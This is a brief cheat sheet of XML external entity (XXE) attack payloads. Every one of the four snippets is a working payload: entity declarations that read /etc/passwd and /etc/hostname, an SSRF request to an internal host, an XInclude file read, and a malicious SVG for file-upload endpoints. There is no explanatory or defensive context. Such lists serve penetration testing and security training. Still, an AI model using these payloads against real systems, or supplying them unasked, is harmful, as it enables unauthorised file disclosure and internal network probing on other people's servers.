<h3> Payloads For XXE Vulnerability </h3>

XXE to read local files:

```xml
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

XXE to SSRF

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
```

XXE via XInclude attacks

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

XXE via file upload

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE foo [ <!ENTITY fetch SYSTEM "file:///etc/hostname">]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg"
xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
<text font-size="13" x="28" y="28">&fetch;</text>
</svg>
```
